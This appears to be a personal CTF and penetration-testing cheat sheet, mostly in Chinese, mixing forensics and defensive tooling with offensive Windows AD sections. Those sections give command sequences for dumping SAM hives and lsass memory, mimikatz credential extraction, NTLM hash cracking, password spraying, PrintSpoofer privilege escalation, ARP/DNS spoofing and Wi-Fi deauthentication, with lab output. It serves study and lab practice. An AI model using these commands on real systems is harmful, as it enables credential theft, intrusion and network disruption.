---
title: Misc Cheat Sheet
tags: [Tools, CTF, Misc]

category: "Tools｜CTF"
date: 2024-01-31
---

# Misc Cheat Sheet
<!-- more -->

## CTF - Encode & Decode
* [Free Online Barcode Reader](https://online-barcode-reader.inliteresearch.com/)
* [QR Code Barcode Reader Online](https://products.aspose.app/barcode/recognize/qr#/recognized)
* [Encoding](https://emn178.github.io/online-tools/index.html)
* [獸語](https://roar.iiilab.com/)

## CTF - Check file info
```bash
$ binwalk [-e] [filename] # or binwalk --dd=".*" [filename]
$ exiftool [filename]
$ pngcheck [filename]
$ stat [filename]
$ file [filename]
```
* `$ binwalk -e` 的範例可以參考[Deadface - Electric Steel ]({{base.url}}/DEADFACE-CTF-2023#Electric-Steel)

## CTF - Steganography
* text: [zsteg](https://github.com/zed-0xff/zsteg)(just for `bmp` and `png` files), [Quick Crypto](http://quickcrypto.com/download.html)
* file: steghide(`sudo apt-get install steghide`)(`$ steghide extract -sf atbash.jpg`)
* 進階的steghide → [stegseek](https://github.com/RickdeJager/stegseek)
    ```bash
    $ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
    $ sudo apt install ./stegseek_0.6-1.deb -y
    $ stegseek [stegofile.jpg] [wordlist.txt]
    ```
* [Online Tool - Aperi'Solve](https://aperisolve.fr/)

## CTF - Sound
* hide files: [MP3stego](https://www.petitcolas.net/steganography/mp3stego/)
    ```bash
    $ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3
    $ ./decode -X -P pass svega_stego.mp3
    ```
* sound to image:
    * [How to convert a SSTV audio file to images using QSSTV - en](https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04)
    * [How to convert a SSTV audio file to images using QSSTV - zh-cn](https://www.srcmini.com/62326.html)
* hide message: [silenteye](https://sourceforge.net/projects/silenteye/)

## CTF - Others
* [All stego decrypt tools](https://aperisolve.fr/)
* [All stego encrypt tools](https://tools.miku.ac/)
* [ctf tool](http://www.ctftools.com/)
* [Other people's note](https://w1a2d3s4q5e6.blogspot.com/2016/06/blog-post.html)

## Pentest
可以參考[^1]，裡面有詳細說明Vulnerability Assessment and Penetration Testing (VAPT)會使用到的工具有哪些。

### 平台
* Kali的所有工具可以直接參考[^2]，裡面有詳細分類
    * Information Gathering Tools(67)
    * Vulnerability Analysis Tools(27)
    * Exploitation Tools(21)
    * Wireless Attacks Tools(54)
    * Forensics Tools(23)
    * Web Applications tools(43)
    * Stress Testing tools(14)
    * Sniffing & Spoofing Tools(33)
    * Password Attacks Tools(39)
    * Maintaining Access Tools(17)
    * Reverse Engineering Tools(11)
    * Reporting Tools(10)
    * Hardware Hacking(6)
    * Some Parrot OS in-built tools(20)
* [Everything About Net Scanning](https://www.yougetsignal.com/)
* [WpScan](https://wpscan.com/): 專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
* [Nessus教學](https://ithelp.ithome.com.tw/articles/10268209): Nessus 作為修復網路、網站和軟體開發中的安全漏洞、作業系統漏洞、應用程式漏洞、配置漏洞等的工具
* [Metasploit教學](https://ithelp.ithome.com.tw/articles/10302923)


### Pre-engagement interactions
* 確認測試範圍
* 簽 NDA
* 確定目標

### Intelligence Gathering (Recon)
* [Google Hacking](https://www.exploit-db.com/google-hacking-database)

    | Syntax | Description | Example |
    | ------ | ----------- | ------- |
    |+|連接多個關鍵字|--|
    |-|忽略關鍵字|--|
    |..|範圍|--|
    |\*|萬用字元|--|
    |''|精準查詢，一定要符合關鍵字|index of|
    |intext|搜尋網頁內容，列出符合關鍵字的網頁|intext:SECRET_KEY|
    |intitle|搜尋網頁中的標題|intitle:index of|
    |define|搜尋關鍵字的定義|define:hacker|
    |filetype|搜尋指定類型的文件|filetype:pdf|
    |info|搜尋指定網站的基本資訊|info:www.fcu.edu.tw|
    |related|搜尋類似於指定網站的其他網站|related:www.fcu.edu.tw|
    |inurl|尋找指定的字串是否在網址列當中|inurl:www.fcu.edu.tw|
    | site   | 搜尋指定網址的內容|site:www.fcu.edu.tw|
* [Shodan](https://www.shodan.io/dashboard) / [Censys](https://search.censys.io/): 搜尋 Internet 上所有公開設備與服務的搜尋引擎
    ![](https://hackmd.io/_uploads/Hym-h3oH2.png)

#### For Windows AD
* 查詢本地使用者
    ```bash
    $ net user
    $ net user <username>
    ```
* 查詢網域使用者
    ```bash
    $ net user /domain
    $ net user <username> /domain
    ```
* 可能可以從AD user的description中看到機敏資訊
    ```bash
    $ Get-ADUser -Filter * -Proper Description | Select-object Name,Description
    ```
* 情報蒐集：當前網域控制站(DC)，以下兩種都可以
    ```bash
    $ echo %logonserver%
    $ nltest /dclist:kuma.org
    ```

#### Inspect Platform
* [Virus Total](https://www.virustotal.com/gui/home/upload)
* [Alien Vault](https://otx.alienvault.com)
* [IBM X-Force](https://exchange.xforce.ibmcloud.com)
* [Any.Run](https://app.any.run/): Online Sandbox
* [Hybrid Analysis](https://www.hybrid analysis.com/)

#### Mail
* [PST Viewer](https://goldfynch.com/goldfynch-pst-viewer)
* [eml Viewer](https://products.groupdocs.app/zh-hant/viewer/eml)
* [ThunderBird Client](https://www.thunderbird.net/zh-TW/)

#### OSINT
* [sherlock](https://github.com/sherlock-project/sherlock)
    ```bash
    $ git clone https://github.com/sherlock-project/sherlock.git
    $ cd sherlock
    $ conda create --name sherlock python=3.10 -y
    $ pip install -r requirements.txt
    $ python sherlock/sherlock.py {username}
    ```
* [Image Search](https://images.google.com/)
* [Google Map](https://www.google.com/maps)
* [OSINT Framework](https://osintframework.com/)
    * [Phone](https://www.truecaller.com)
    * [Whois](https://www.whois.com/whois) or [ipwhoisinfo](https://ipwhoisinfo.com/)
    * [Whatsmyname - online tool](https://whatsmyname.app/)
    * [DNS Lookup(從Domain Name看IP)](https://www.whatismyip.com/dns-lookup/)
* 如果要查看手機本身的Network IP(不是wifi)，可以看 https://ipinfo.io 

#### [Web Directory]({{base.url}}/Directory-Fuzzing-&-Traversal-Tools/)
* Dirbuster
* Gobuster
* [Wfuzz]({{base.url}}/WFuzz/)

#### Network Info & Package
* [Wireshark cheat sheet](https://packetlife.net/blog/2008/oct/18/cheat-sheets-tcpdump-and-wireshark/)
    
    |Type|eth|ip|tcp|udp|說明|
    |---|---|---|---|---|---|
    |dst|eth.dst == ff:ff:ff:ff:ff|ip.dst == 140. 134.4. 1|||目的 MAC/IP|
    |src|eth.src == 00:e0:18:64;ce:f2|ip.src == 140.134. 30.72|||來源 MAC/IP|
    |addr|eth.addr == ff:ff:ff:ff:ff|ip.addr == 140.134. 30.72|||MAC/IP 位址|
    |proto||ip.proto == 0x06(TCP)<br>ip.proto == 0x01(ICMP)<br>ip.proto == 0x11 (UDP)|||下一層協定|
    |type|eth.type == 0x800(IP)<br>eth.type == 0x806(ARP)||||下一層協定|
    |port|||tcp.port == 23(Talnet)|ucp.port == 53|Port編號|
    |dstport|||tcp.dstport == 80(HTTP)|ucp.dstport == 53(DNS)|目的Port|
    |scrport|||tcp.scrport == 21(FTP)|ucp.scrport == 69(TSTP)|來源Port|
* [nmap](http://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86), [教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
    ```bash
    $ sudo apt-get install nmap
    ```
* [ntpdc](https://www.ibm.com/docs/zh-tw/aix/7.3?topic=n-ntpdc4-command)
    ```bash
    $ sudo apt-get install ntpdc
    ```
* tcpflow
    ```bash
    $ sudo tcpflow -r {pcap file}
    ```
* [dsniff](https://github.com/tecknicaltom/dsniff): Various tools to sniff network traffic for cleartext insecurities
    * arpspoof: 
        ```bash
        $ arpspoof -t victim_ip router_ip
        $ arpspoof -i eth0 -t victim_ip -r gateway
        ```
    * dnsspoof: Forge replies to DNS address / pointer queries
        ```bash
        $ sudo dnsspoof -i eth0 -f dns.txt
        ```
    * dsniff: Password sniffer
* [Snort](https://www.snort.org/downloads): 是一個非常知名的開源網路入侵偵測系統（IDS, Intrusion Detection System），有3種模式
    * Sniffer Mode: 最基本模式，只是讀取封包並顯示，類似tcpdump
        ```bash
        $ snort -v
        ```
    * Packet Logger Mode: 將封包記錄到檔案
        ```bash
        $ snort -dev -l ./log
        ```
    * Network Intrusion Detection System Mode（NIDS最常用）: 使用 rules 來偵測攻擊
        ```bash
        $ snort -c snort.conf
        $ sudo snort -d -l [target directory]
        $ sudo snort -d -l /var/log/snort/ -c /etc/snort/snort.conf -A console
        ```

        ```txt
        # 如果任何 TCP 流量連到192.168.1.10:80就產生 alert
        alert tcp any any -> 192.168.1.10 80 (msg:"Possible attack"; 
        sid:10001;)

        # 如果某個來源在 1 秒內向 SSH server 發送 2 次 SSH 連線流量，就觸發警報。
        ## 任何 TCP 流量 → port 22 都會被檢查。
        ## 只檢查 client 發送到 SSH server 的封包
        ## 封包 payload 必須包含：SSH
        ## 不區分大小寫
        ## 從 payload 的 第 0 byte 開始比對。
        ## 只檢查 前 4 bytes。所以實際上檢查：payload[0:4]是否包含：SSH
        ## 同一個來源 IP在 1 秒內發送 2 次符合條件的封包
        ## 每個 rule 的唯一 ID。
        alert tcp any any -> any 22 
        ( msg:"SSH Brute Force Attempt"; 
        flow:established,to_server; 
        content:"SSH"; 
        nocase; 
        offset:0; 
        depth:4; 
        detection_filter:track by_src, count 2, seconds 1; 
        sid:1000001; 
        rev:1;)

        /etc/snort/snort.conf # Snort config file
        /var/log/snort/ # Snort log path
        /etc/snort/rules/ # Snort rule path
        ```

### Threat Modeling
* 分析 attack surface
* 找 attack path

### Vulnerability Analysis
* 找漏洞
* CVE analysis

#### For Windows AD
* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng): 如果已經進入AD，想要本地提權，比較快的方式就是直接利用本地端的弱點，這個repo可以分析目前的狀況給予一些cve的建議
    ```bash
    $ git clone https://github.com/bitsadmin/wesng.git --depth 1
    $ cd wesng
    $ python wes.py --update
    $ systeminfo.exe > systeminfo.txt # 這條指令是windows內建的指令，所以一定要在cmd中操作
    $ python wes.py systeminfo.txt
    ```

### Exploitation
* 利用漏洞取得 access
* Post Exploitation

#### For Windows AD
* 錯誤配置
    * 服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的
    * 透過[accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)找出有問題的地方
        ```bash
        $ accesschk.exe <user> <path>
        
        $ accesschk.exe "Administrator" "C:\\Program Files\\"

        Accesschk v6.15 - Reports effective permissions for securable objects
        Copyright (C) 2006-2022 Mark Russinovich
        Sysinternals - www.sysinternals.com
        RW C:\\Program Files
        ```
* 收集更多密碼<span style="background-color: yellow">(已經提權成功的前提下)</span>
    * Brute Force SAM
        1. 利用reg.exe(Windows註冊碼工具)匯出SAM File
            ```bash
            # 方法1
            $ reg save HKLM\\SAM <save filename>
            $ reg save HKLM\\SYSTEM <save filename>
            # 方法2
            $ c:\\tools\\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"
            # 方法3: 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製
            $ .\\Invoke-NinjaCopy -Path SAM -LocalDestination C:\\tools\\SAM_COPY
            ```
            [Invoke-NinjaCopy.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1)
        2. 解析SAM內容
            * Win10 v1607之前的解法: 用kali的samdump2解析，如果看到很多disabled，就要使用下面的方法
                ```bash
                $ samdump2 system sam 
                ```
            * Win10 v1607之後有用到AES加密，所以可以用[Creddump7](https://github.com/CiscoCXSecurity/creddump7)，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事
                ```bash
                $ conda activate py2.7
                $ pip install pycrypto
                $ git clone https://github.com/CiscoCXSecurity/creddump7.git
                $ python pwdump.py system sam
                ```
        3. 解析hash
            * 方法一：用online database，就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如[cmd5](https://www.cmd5.com/)
            * 方法二：爆字典檔，在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
                ```bash
                $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
                $ cp /usr/share/wordlists/rockyou.txt ./
                $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
                ```
    * Password Spraying(用猜的)用一組密碼去爆所有的帳號: [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) - 結合各種功能的內網滲透神器
        ```bash
        $ crackmapexec <protocol> <target(s)> -u <a file or string only> -p <a file or string only>

        # For example
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
        $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
        $ crackmapexec smb <filename> -u administrator -p Passw0rd --local-auth

        # 實際的例子
        $ $ crackmapexec smb 192.168.222.128/24 -u administrator -p 1qaz@WSX3edc             
        SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
        SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
        SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!)
        SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!)
        ```
    * 記憶體(lsass): 透過Mimikatz取得Local Admin的NTLM
        1. 把lsass dump下來
            * 找到Local Security Authority Process(LSASS)，右鍵選**建立傾印檔案**，就可以直接dump memory
            * 直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限
                ```bash
                $ procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\\tmp.txt
                ```
        2. 分析lsass
            * 以系統管理員啟動mimikatz
                ```bash
                $ Privilege::Debug
                Privilege '20' OK
                $ log
                Using 'mimikatz.log' for logfile : OK
                $ Sekurlsa::logonPasswords
                ```
            * 如果Mimikatz不能用，或是直接被defender刪除，可以把檔案丟到自己的電腦用mimikatz分析，或者是透過Minidump獲取資訊
                ```bash
                $ Sekurlsa::minidump "<path to lsass.dmp>"
                Switch to MINIDUMP : '<path to lsass.dmp>'
                $ Sekurlsa::logonPasswords
                ```
        * 顯示Mimikatz的明文
            * 有辦法重開機
                1. 只要打開regedit，在`電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`可能會看到`UseLogonCredential`的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增
                2. 重開機: 重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看
            * 沒有辦法重開機
                1. Inject memssp: 用系統管理員權限開mimikatz
                    ```bash
                    $ privilege::debug
                    $ misc::memssp
                    Injected =)
                    ```
                2. Relogin: 重新登出再登入才會看到
                3. 在`C:\Windows\System32\mimilsa.log`可以看到用明文的方式新增了密碼

    * AS-REP Roasting: 是一種針對 Kerberos authentication 的攻擊技術，用來 離線破解使用者密碼，而且通常 不需要先登入任何帳號，可以直接看[NTUSTISC - AD Note - Lab(0x21 AS-REP Roasting)]({{base.url}}/NTUSTISC-AD-Note-Lab(0x21AS-REP-Roasting)/)的教學

#### RDP
* Linux / Kali
    * xfreerdp
        ```bash
        $ sudo apt install freerdp2-x11 -y
        $ ipconfig # check win10 ip
        $ xfreerdp /d:<domain> /p:<passwd> /v:<ip> /u:<user>
        $ xfreerdp /d:kuma.org /p:1qaz@WSX3edc /v:192.168.222.129 /u:administrator
        ```
    * [Libfreerdp](https://packages.debian.org/sid/libfreerdp-client2-2)
    * Impacket
        ```bash
        # Set up & Install
        $ git clone https://github.com/fortra/impacket.git
        $ cd impacket
        $ conda activate py3.7 # Recommended to install it in conda
        $ pip3 install -r requirements.txt
        $ python3 setup.py install
                
        # Cheat-Sheet
        $ conda activate py3.7
        $ proxychains psexec.py <username>:<password>@<ip> whoami
        $ proxychains psexec.py kuma\administrators:1qaz@WSX3edc@192.168.222.129 dir
        ```
    * CrackMapExec
        ```bash
        $ crackmapexec smb <IP> -u <username> -p <password --exec-method smbexec -x '<command>'
        # exec-method支援以下方法: mmcexec, smbexec, wmiexec, atexec
        $ crackmapexec smb 192.168.222.129 -u administrator -p 1qaz@WSX3edc --exec-method smbexec -x 'dir C:\tools'
        ```
* Windows
    * Psexec.exe
        ```bash
        $ PsExec.exe -i \\<Remote IP> -accepteula -u <domain>\\<Remote Username> -p <Remote Password> cmd
        $ PsExec.exe -i \\192.168.222.129 -accepteula -u kuma.org\\administrator -p 1qaz@WSX3edc cmd
        ```
    
#### Wireless Related
* 大部分都會用到[Aircrack](https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/)這個工具
* Deauthentication - [airodump-ng教學](http://atic-tw.blogspot.com/2014/01/airodump-ng.html) / [aireplay-ng教學](http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html)
    * 攻擊說明: [\[Day 05\]資安百物語：第二談：現代飛頭蠻的反制法-反無人機技術(下) ](https://ithelp.ithome.com.tw/articles/10218551?sc=rss.iron)
    1. Scan
        將掃描範圍縮小到一個目標，並取得連接到目標網路的裝置的MAC位址。
        ```
        $ airodump-ng -bSSID <bssid> --ch <channels> WLAN0mon
        # 此命令用於通過識別 BSSID（基本服務集識別符）和所使用的通道來設置目標網路上的掃描
        # -c: 指定只接收特定的 channels，如果有多個 channel，用 , 分隔，例如：-c 6,8,10,11
        ```
    2. Attack
        ```bash
        $ aireplay-ng --deauth <count, e.g. 1000> -a <bssid, e.g. 6A:BF:C4:06:35:94> -c <AP MAC address, e.g 34:CF:F6:96:72:E2> wlan0mon
        # -c dmac : 指定 Client 的 MAC address
        # -a bssid : 指定 AP 的 MAC address
        # --deauth:  count 是指執行阻斷的次數，如果設為 0 表循環攻擊，Client 將無法上網。
        ```
* Fluxion: 攻擊說明與工具教學: [實戰-Fluxion與wifi熱點偽造、釣魚、中間人攻擊、wifi破解](https://www.cnblogs.com/xuanhun/p/5783836.html)，Fluxion 攻擊的主要目標是獲取目標 Wi-Fi 網路使用者使用的密碼或訪問憑據。此攻擊可使攻擊者未經授權訪問目標網路，而有關於Captive Portal(WEB Portal)的驗證流程可以參考[這篇](https://ithelp.ithome.com.tw/articles/10280421)
    1. Captive Portal Attack
        根據前面的background可以知道web portal的驗證流程，那如果把原本的hotspot換成一個假的hotspot，讓使用者誤以為這是真的驗證頁面(需要帳號密碼之類的)，那我們就有機會拿到credentials session
    2. 直接取得SSID/BSSID/Channel Used/Password Used/Type of Security Applied
* MITM - [Xerosploit教學](https://blog.csdn.net/chinabyxl/article/details/121463891): Sniff模組允許攻擊者監控通過目標Wi-Fi網路的數據流量，包括使用者發送的數據。通過監視此類流量，攻擊者可以竊取身份驗證憑據、個人資訊或其他敏感數據等資訊，sniff完了以後可以用wireshark打開看流量
* WEP/WPA Attack: WEP/WPA 注入攻擊是針對使用 WEP/WPA 安全協定的無線網路的針對性攻擊。此攻擊旨在滲透網路安全並獲得對透過網路傳輸的資料流量的未經授權的存取。一旦收集到加密的流量數據，攻擊者就可以分析該數據的模式和結構，以識別網路中使用的加密金鑰。透過取得加密金鑰，攻擊者可以破解透過網路發送的資料流量的加密。
    1. Handshake on the target Wi-Fi network
* DoS - Aircrack的Wi-Fi DoS攻擊

#### Brute Force
* For system user:[John The Ripper](https://www.openwall.com/john/), [教學](https://ithelp.ithome.com.tw/articles/10300529)
    ```bash
    # NTLM
    $ ./run/john.exe {pwn file} --wordlist={dictionary path} --format={NT...}
    
    # JWT
    $ john jwt.txt --wordlist={e.g. /usr/share/wordlists/rockyou.txt} --format={jwt alg, e.g. HMAC-SHA256}
    ```
* [Rockyou.txt](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwiyotmP3uD_AhVB72EKHd3QCHMQFnoECBQQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd&opi=89978449)
* [Online Tool 1](https://www.cmd5.com/)
* [Online Tool 2](https://hashes.com/en/decrypt/hash)
* [hashcat](https://home.gamer.com.tw/creationDetail.php?sn=3669363):
    ```bash
    # NTLM
    $ hashcat -a 0 -m 1000 {ntlm.hash} {rockyou.txt} --force
    
    # JWT
    $ hashcat -a 3 -m 16500 {jwt.txt} {secrets format, e.g. ?a?a?a?a}
    ```
* 生成字典: [Crunch](https://www.kali.org/tools/crunch/)
    ```bash
    # crunch <min_length> <max_length> [charset]
    $ crunch 4 4 # 生成所有 4 個字元的組合aaaa ~ zzzz
    $ crunch 4 4 abc # 可以指定可使用的字元 aaaa ~ cccc
    ```
* for WPA/Wifi based: [`aircrack-ng`](https://linuxhint.com/install_aircrack-ng_ubuntu/), [Wifite](https://ithelp.ithome.com.tw/articles/10280928)
* creddump: [教學]({{base.url}}/NTUSTISC-AD-Note-Lab(0x13Brute-Force-SAM)/)

### Privilege Escalation
* lateral movement
* data exfiltration
* For Windows: [Mimikatz](https://github.com/ParrotSec/mimikatz): 一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。實際使用可以參考[NTUSTISC - AD Note - Lab(0x16透過Mimikatz取得Local Admin的NTLM)]({{base.url}}/NTUSTISC-AD-Note-Lab(0x16透過Mimikatz取得Local-Admin的NTLM)/)

#### For Windows AD
* Hijack Token: [PrintSpoofer](https://github.com/itm4n/PrintSpoofer): Support: Windows 8.1/Server 2012 R2/10/Server 2019
    * 如果進入的AD有`SeImpersonatePrivilege => CreateProcessWithToken()`,`SeAddignPrimaryToekn => CreateProcessAsUser()`這兩個其中一個權限的話才能用
    ```bash
    $ whoami /priv # 先看一下目前的AD有哪些權限
    $ PrintSpoofer.exe -c "whoami"
    [+] Found privilege: SeImpersonatePrivilege
    [+] Named pipe listening ...
    [+] CreateProcessAsUser() OK
    $ PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c whoami > c:\inetpub\wwwroot\tmp.txt"
    $ cat "c:\inetpub\wwwroot\tmp.txt"
    nt authority\\system # 目前權限已經轉換成nt authority\system也就是前面說的==本地端真正的最高權限使用者==
    ```

### Reporting
* 撰寫 pentest report
* remediation suggestion
* CaseFile
* dos2unix

## Forensics
* [LNK Parser](https://code.google.com/archive/p/lnk-parser/downloads)

### Disk Analysis
* [Foremost](https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm): 針對所支援的檔案結構去進行資料搜尋與救援
    ```bash
    $ foremost -v {filename}
    ```
* [Sleuth kit/Autopsy](https://blog.csdn.net/wxh0000mm/article/details/99447206)
* [FTK Imager](https://www.exterro.com/ftk-imager)
* [Logontracer]({{base.url}}/How-to-install-LogonTracer/): Just use GUI to present event log traced on windows
    ```bash
    $ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost
    ```

### Memory Forensics
* 建議直接使用[windown protable version](https://www.volatilityfoundation.org/releases)會比較穩定而且不需要處理環境的問題
* [Volatility - Cheat Sheet](https://hackmd.io/@TuX-/BymMpKd0s)
* [Volatility 3](https://github.com/volatilityfoundation/volatility3)
    
    Set up & How2Use
    * [Windows Volatility 3 Problems & Solutions](https://blog.csdn.net/u011250160/article/details/120461405)
    * [Windows Set up Tutorials](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html)
    
    ```bash
    $ git clone https://github.com/volatilityfoundation/volatility3
    $ cd volatility3
    $ pip install -r requirement.txt
    $ python vol.py -f <path to memory image> plugin_name plugin_option
    $ python vol.py -h # For help
    ```
    
* [Volatility 2](https://github.com/volatilityfoundation/volatility)
    
    Set up & How2Use
    [Windows Set up Tutorials](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html)
    ```bash
    $ conda create --name py27 python=2.7
    $ conda activate py27
    $ git clone https://github.com/volatilityfoundation/volatility
    $ cd volatility
    $ pip install pycrypto
    $ pip install distorm3
    $ python vol.py -f <path to memory image> plugin_name plugin_option
    $ python vol.py -h # For help
    ```

### Registry
* [Regshot](https://sourceforge.net/projects/regshot/): 可以snapshot目前registry的狀態並且和第二次的snapshot做比較

## 資安防禦平台與工具
* 完整的流程可以參考[TaiwanHolyHigh - Windows Forensics - Background]({{base.url}}/TaiwanHolyHigh-Windows-Forensics-Background/)

### XDR
* [WAZUH](https://wazuh.com/)

### SIEM
* [splunk](https://www.splunk.com/)
* [ArcSight](https://www.microfocus.com/en-us/cyberres/secops/arcsight-esm)

### AD
* [Ping Castle](https://www.pingcastle.com/): 這個工具可以幫AD環境做快速的稽核，然後會產生報表，讓使用者可以一目了然目前AD的狀況
* Active Directory Users and Computers(ADUC): 可以看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看的到，所以不可以把機敏資料寫在這裡例如帳密之類的。本身不是獨立軟體，而是 Windows Server 的 RSAT（Remote Server Administration Tools）工具集的一部分。

## Sysinternal
### 系統操作與管理
* [PsExec](https://learn.microsoft.com/zh-tw/sysinternals/downloads/psexec)
    > psexec是windows下非常好的一款遠程命令行工具。psexec的使用不需要對方主機開機3389端口，只需要對方開啟admin共享或c(該共享默認開啟，依賴於445端口)。但是，假如目標主機開啟了防火墻(因為防火墻默認禁止445端口的連接)，psexec也是不能使用的，會提示找不到網絡路徑。由於psexec是windows提供的工具，所以殺毒軟件會將其添加到白名單中。
* PsKill: 終止本地或遠端進程。
* PsList: 列出進程資訊，包括 CPU、記憶體使用情況。
* PsLoggedOn	查看誰登入了本機或遠端系統。
* PsService	管理本地或遠端服務（啟動、停止、查詢狀態）。

### 系統資訊與監控
* Sysmon
    > 事件識別碼 1：處理程序建立
    > 處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 `ProcessGUID` 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 `HashType` 欄位中的演算法。
    > 
    > 事件識別碼 8：CreateRemoteThread
    > `CreateRemoteThread` 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、`StartModule` 和 `StartFunction`。 請注意，系統會推斷 `StartModule` 和 `StartFunction` 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。
    > 
    > 事件識別碼 11：FileCreate
    > 建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。
    > 
    > 事件識別碼 13：RegistryEvent (值已設定)
    > 此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 `DWORD` 和 `QWORD` 的登錄值所寫入的值。
* Procexp (Process Explorer) & Process Hacker
    好看版的工作管理員
* Procmon
    * 監控程序行為
    * Registry
    * File system
    * Network
    * Process/Thread
* Procdump: 產生指定進程的 memory dump
    ```bash
    $ dump lsass.exe memory # 取得憑證（這是很多 Windows 後門 / lateral movement 攻擊的方式）。
    ```

### 網路分析
* TCPView: 顯示所有 TCP/UDP 連線和端口使用狀態，可用於偵測可疑連線。
* PsPing: 提供 ping、延遲測試和帶寬測量功能，比內建 ping 更靈活。
* whois
    ```bash
    $ whois64.exe -v domainname
    ```

### 安全取證 / 數位取證
* AccessChk: 用來查看「某個 user / group 對某個資源到底有沒有權限」，查看檔案、登錄項、服務的權限，方便檢查系統安全性。
    ```bash
    # 檢查某 user 對資料夾權限
    $ accesschk user C:\\test

    # 找可寫的 service（常見提權）
    $ accesschhk -uwcqv "Authnticated Users" *

    # 找可寫的 registry
    $ accesschk -k HKLM\\Software

    # 找某 user 的所有權限
    $ accesschk -d user
    ```
* Sigcheck: 驗證執行檔簽名與版本資訊，檢測潛在惡意程式。
* VMMap: 分析程序的記憶體使用情況，包括堆、棧、映射文件。

## Reference
[^1]:Ravindran, U., & Potukuchi, R. V. (2022). A Review on Web Application Vulnerability Assessment and Penetration Testing. Review of Computer Engineering Studies, 9(1).
[^2]:[ul Hassan, S. Z., Muzaffar, Z., & Ahmad, S. Z. (2021). Operating Systems for Ethical Hackers-A Platform Comparison of Kali Linux and Parrot OS. International Journal, 10(3).](https://www.researchgate.net/profile/Syed-Zain-Ul-Hassan-2/publication/369305777_Operating_Systems_for_Ethical_Hackers_-_A_Platform_Comparison_of_Kali_Linux_and_Parrot_OS/links/6414544c315dfb4cce89b6a3/Operating-Systems-for-Ethical-Hackers-A-Platform-Comparison-of-Kali-Linux-and-Parrot-OS.pdf)